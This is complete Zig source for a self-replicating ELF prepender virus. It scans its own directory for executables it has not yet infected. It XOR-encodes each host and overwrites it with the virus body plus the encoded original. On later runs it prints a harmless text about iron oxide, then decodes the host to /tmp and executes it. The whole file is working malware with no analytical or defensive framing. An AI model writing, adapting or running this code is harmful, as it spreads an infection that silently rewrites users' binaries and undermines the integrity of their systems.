const std = @import("std");
const fs = std.fs;
var gpa = std.heap.GeneralPurposeAllocator(.{}){};
const stdout_file = std.io.getStdOut().writer();

const ELF_MAGIC = "\x7FELF";
const INFECTION_MARK = "0xTF";
const XOR_KEY = "zPrepend";
const MAX_SIZE_OF_FILE = 10 * 1024 * 1024;
const VIRUS_SIZE: u64 = 2430504;

const Infector = struct {
    alloc: std.mem.Allocator,
    writer: std.fs.File.Writer = stdout_file,

    pub fn init() Infector {
        const alloc = gpa.allocator();
        return Infector{
            .alloc = alloc,
        };
    }

    pub fn run(self: Infector) !void {
        const current_bin_path = try fs.selfExePathAlloc(self.alloc);
        defer self.alloc.free(current_bin_path);

        const current_dir_path = try fs.selfExeDirPathAlloc(self.alloc);
        defer self.alloc.free(current_dir_path);

        var current_dir = try fs.openDirAbsolute(current_dir_path, .{
            .iterate = true,
        });
        defer current_dir.close();

        var directory_iter = try current_dir.walk(self.alloc);
        defer directory_iter.deinit();

        while (directory_iter.next()) |entry| {
            if (entry) |e| {
                if (e.kind == fs.File.Kind.file) {
                    const file_complete_path = try std.fmt.allocPrint(self.alloc, "{s}/{s}", .{ current_dir_path, e.path });
                    defer self.alloc.free(file_complete_path);

                    if (std.mem.eql(u8, file_complete_path, current_bin_path)) {
                        continue;
                    }
                    const meta = try e.dir.statFile(e.basename);

                    const elf = try self.is_elf(&file_complete_path);
                    const infected = try self.is_infected(&file_complete_path, &meta);

                    if (elf and !infected) {
                        try self.infect(&current_bin_path, &file_complete_path);
                    }
                }
            } else {
                break;
            }
        } else |err| {
            return err;
        }

        const current_file = try fs.openFileAbsolute(current_bin_path, .{ .mode = .read_only });
        defer current_file.close();
        const meta = try current_file.metadata();

        if (meta.size() > VIRUS_SIZE) {
            try self.payload();
            try self.run_infected_host(&current_file);
        } else {
            std.process.exit(0);
        }
    }

    fn run_infected_host(self: Infector, file: *const fs.File) !void {
        try file.*.seekTo(VIRUS_SIZE);
        const encrypted_buffer = try file.*.readToEndAlloc(self.alloc, MAX_SIZE_OF_FILE);
        defer self.alloc.free(encrypted_buffer);
        const decrypted_buffer = Infector.xor_encode_decode(&encrypted_buffer);

        const plain_file_path = "/tmp/temp";
        const plain_file = try fs.createFileAbsolute(plain_file_path, .{
            .mode = 0x755,
        });
        defer plain_file.close();
        _ = try plain_file.write(decrypted_buffer);
        try plain_file.sync();

        const argv = [_][]const u8{plain_file_path};
        var proc = std.ChildProcess.init(&argv, self.alloc);
        const a = try proc.spawnAndWait();
        _ = a;

        try fs.deleteFileAbsolute(plain_file_path);
    }

    fn infect(self: Infector, virus: *const []u8, target: *const []u8) !void {
        const host_file = try fs.openFileAbsolute(target.*, .{ .mode = .read_only });
        defer host_file.close();
        const host_buf = try host_file.readToEndAlloc(self.alloc, MAX_SIZE_OF_FILE);
        defer self.alloc.free(host_buf);
        const encrypted_buf = Infector.xor_encode_decode(&host_buf);
        var virus_buffer: [VIRUS_SIZE]u8 = undefined;
        const virus_file = try fs.openFileAbsolute(virus.*, .{ .mode = .read_only });
        defer virus_file.close();
        _ = try virus_file.read(&virus_buffer);

        const infected_file = try fs.createFileAbsolute(target.*, .{ .truncate = true });
        defer infected_file.close();
        _ = try infected_file.write(virus_buffer[0..]);
        _ = try infected_file.write(encrypted_buf[0..]);
        try infected_file.sync();
    }

    fn xor_encode_decode(buffer: *const []u8) []u8 {
        var input = buffer.*;
        for (0..input.len) |i| {
            input[i] ^= XOR_KEY[@mod(i, XOR_KEY.len)];
        }
        return input;
    }

    fn is_elf(self: Infector, path: *const []u8) !bool {
        _ = self;
        var header: [4]u8 = undefined;
        const file = try fs.openFileAbsolute(path.*, .{
            .mode = .read_only,
        });

        _ = try file.read(&header);

        return std.mem.eql(u8, &header, ELF_MAGIC);
    }

    fn is_infected(self: Infector, file_path: *const []u8, file_stat: *const std.fs.File.Stat) !bool {
        const file_size = file_stat.*.size;
        const file = try fs.openFileAbsolute(file_path.*, .{ .mode = .read_only });
        defer file.close();
        const buffer = try file.readToEndAlloc(self.alloc, MAX_SIZE_OF_FILE);
        defer self.alloc.free(buffer);

        for (1..file_size) |i| {
            if (buffer[i] == INFECTION_MARK[0]) {
                for (1..INFECTION_MARK.len) |j| {
                    if (i + j >= file_size) break;
                    if (buffer[i + j] != INFECTION_MARK[j]) break;
                    if (j == INFECTION_MARK.len - 1) {
                        return true;
                    }
                }
            }
        }

        return false;
    }

    fn payload(self: Infector) !void {
        try self.writer.print("Iron(II,III) oxide, or black iron oxide, is the chemical compound with formula Fe3O4.\nIt occurs in nature as the mineral magnetite. It is one of a number of iron oxides, the others being iron(II) oxide (FeO), which is rare, and iron(III) oxide (Fe2O3) which also occurs naturally as the mineral hematite.\n", .{});
    }
};

pub fn main() !void {
    const infector = Infector.init();
    defer _ = gpa.deinit();
    try infector.run();
}
